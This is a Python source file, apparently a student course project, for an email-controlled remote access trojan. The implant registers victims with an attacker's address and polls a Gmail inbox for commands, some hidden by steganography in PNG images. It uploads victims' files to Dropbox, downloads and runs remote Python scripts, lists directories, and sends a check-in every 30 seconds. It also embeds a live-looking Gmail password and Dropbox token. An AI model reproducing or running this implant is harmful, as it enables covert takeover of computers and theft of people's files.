import os
import smtplib
import imaplib
import email
import time
import socket
import ssl
import dropbox
import uuid
from stegano import lsb

#Commands List
#To send a file to user: download [Dropbox path] [Local name] [id]
#To receive a file from user: fetch [file path] [id]
#To execute a python script from dropbox: execute [Dropbox path] [id]
#To receive directory information: show [Directory path] [id]
#NOTE: Use "all" in place of id if you want this to send to all processes running.

emailAdr = "os.services.updates@gmail.com"
password = "cse363esc"
SMTP_SERVER = "imap.gmail.com"
#attacker_email = "Augusto Celis <augusto.celis@stonybrook.edu>"
attacker_email = "William Chen <william.chen@stonybrook.edu>"
SMTP_PORT = 993
commands = []
executable_file = "pip_install.py"
auth_token = "eSp1cKEzdOAAAAAAAAAAFHo3_k2buR70MgbGUlJ0vUGBmyIC1YfW05u2b6AS6M6R"
id = uuid.uuid4()
#initialize dropbox
dbx = dropbox.Dropbox(auth_token)
#Keep track of last Command used
lastCommand = ""

#Sends over email with initial credentials
def initMessage():
    message = "Subject: " + str(id) + " is registered boss."
    sendEmail(message)

#Get infected IP
def getIP():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    IPaddr = s.getsockname()[0]
    s.close()
    return IPaddr

#Upload a file to dropbox
def upload_file(path):
    splitPath = path.split("/")
    dbxPath = "/" + splitPath[-1]
    #print(dbxPath)
    try:
        with open(path, 'rb') as f:
            dbx.files_upload(f.read(), '/' + str(id) + dbxPath)
            #SEND AN EMAIL AS RECEIPT OF EXECUTION
            execution_receipt = "Subject: Uploaded " + path + " from " + str(id) + " computer." + "\n\n"
            execution_receipt += "Successfuly uploaded file to dropbox"
            sendEmail(execution_receipt)
    except:
        execution_receipt = "Subject: Failed to upload " + path + " from " + str(id) + " computer." + "\n\n"
        execution_receipt += "Unsuccessfuly uploaded file to dropbox"
        sendEmail(execution_receipt)

#Download a file from dropbox
def download_file(filePath, localName):
    try:
        metadata, res = dbx.files_download(path=filePath)
        with open(localName, "w") as f:
            f.write((res.content).decode())
            #SEND AN EMAIL AS RECEIPT OF EXECUTION
            execution_receipt = "Subject: Downloaded " + filePath + " into " + localName + " file in " + str(id) + " computer." + "\n\n"
            execution_receipt += "Successfuly downloaded from dropbox"
            sendEmail(execution_receipt)
    except:
        execution_receipt = "Subject: Failed to download " + filePath + " into " + localName + " file in " + str(id) + " computer." + "\n\n"
        execution_receipt += "Download failed"
        sendEmail(execution_receipt)

#Send email with msg over SMTP SSL to attacker
def sendEmail(msg):
    port = 465  # For SSL

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(emailAdr, password)
        server.sendmail(emailAdr, attacker_email, msg)

#EMAIL SUBJECT = show [Directory path] [id]
#NEEDS TO START WITH "C:/" UNLESS KNOWN PATH
def showFiles(commandString):
    global lastCommand
    dirList = []
    fileList = []
    splitCommand = commandString.split(" ")
    del(splitCommand[0])
    if len(splitCommand) == 2:
        truePath = splitCommand[0]
        try:
            for x in os.listdir(truePath):
                if os.path.isdir(os.path.join(truePath, x)):
                    dirList.append(x)
                elif os.path.isfile(os.path.join(truePath, x)):
                    size = os.path.getsize(os.path.join(truePath, x))
                    size = size / 1000000000
                    file = x + " \t\t\t" + str(size) + " GB"
                    fileList.append(file)

            directories_string = ""
            files_string = ""
            for dir in dirList:
                directories_string += dir + "\n"
            for file in fileList:
                files_string += file + "\n"

            subjectLine = "Subject: My Directory " + str(id) + "\n\n"
            payload = subjectLine
            payload += lastCommand + ":\n\n" + "Files:\n" + files_string + "\nDirectories:\n" + directories_string
            sendEmail(payload)

        except:
            subjectLine = "Subject: Failed directory fetch from " + str(id)
            sendEmail(subjectLine)


#EMAIL SUBJECT = fetch [file name] [id]
def getFile(commandString):
    splitCommand = commandString.split(" ")
    del(splitCommand[0])
    if len(splitCommand) == 2:
        filePath = splitCommand[0]
        upload_file(filePath)

#EMAIL SUBJECT = download [file name] [local name] [id]
def receiveFile(commandString):
    splitCommand = commandString.split(" ")
    del(splitCommand[0])
    if len(splitCommand) == 3:
        filePath = splitCommand[0]
        localPath = splitCommand[1]
        download_file(filePath, localPath)

#EMAIL SUBJECT = execute [file path from dropbox with python script] [id]
def executeCom(commandString):
    splitCommand = commandString.split(" ")
    del(splitCommand[0])
    if len(splitCommand) == 2:
        execCommand = splitCommand[0]
        download_file(execCommand, executable_file)
        try:
            os.system('python ' + executable_file)
            os.remove(executable_file)

        except:
            subjectLine = "Subject: Failed to run shell exe " + str(id)
            sendEmail(subjectLine)



    #SEND AN EMAIL AS RECEIPT OF EXECUTION
    execution_receipt = "Subject: Executed " + execCommand + " on " + str(id) + "\n\n"
    execution_receipt += "Successfuly executed script"
    sendEmail(execution_receipt)

#Parse commands from emails
def commandParser(commandsParse):
    global lastCommand
    while commandsParse:
        command = commandsParse[0]
        #print(command)
        if "show" in command:
            lastCommand = command
            showFiles(command)
            del commandsParse[0]
        elif "fetch" in command:
            getFile(command)
            del commandsParse[0]
        elif "execute" in command:
            executeCom(command)
            del commandsParse[0]
        elif "download" in command:
            receiveFile(command)
            del commandsParse[0]
        else:
            del commandsParse[0]


#Read an email
def readEmail():
    mail = imaplib.IMAP4_SSL(SMTP_SERVER)
    mail.login(emailAdr, password)
    mail.select('inbox')

    typ, data = mail.search(None, 'ALL')
    isBroadcast = False
    for i in data[0].split():
        typ, data = mail.fetch(i, '(RFC822)' )
        msg = email.message_from_bytes(data[0][1])
        subject = msg['Subject']
        sender = msg['From']
        if(sender == attacker_email):
            if(str(id) in subject):
                mail.store(i, '+FLAGS', '\\Deleted')
                if("Update" in subject):
                    if (len(msg.get_payload()) == 2):
                        attachment = msg.get_payload()[1]
                    if(attachment.get_content_type() == 'image/png'):
                        try: 
                            open('attachment.png', 'wb').write(attachment.get_payload(decode=True))
                            cmd = lsb.reveal("attachment.png")
                            #print(cmd)
                            commands.append(cmd)
                            os.remove('attachment.png')
                        except:
                            print("Error importing image")
                else:
                    commands.append(subject)
            elif("all" in subject):
                commands.append(subject)
                isBroadcast = True
                

    if commands:
       commandParser(commands)

    if(isBroadcast):
        time.sleep(15)
        mail.store(i, '+FLAGS', '\\Deleted')
    mail.expunge()
    mail.close()
    mail.logout()

#Send an update every x seconds
#Check email every x seconds
def periodicUpdates(seconds):
    #startTime=time.time()
    while True:
        readEmail()
        message = "Subject: " + str(id) + "\n\n" + "Checkin in boss"
        sendEmail(message)
        time.sleep(seconds)

initMessage()
periodicUpdates(30.0)
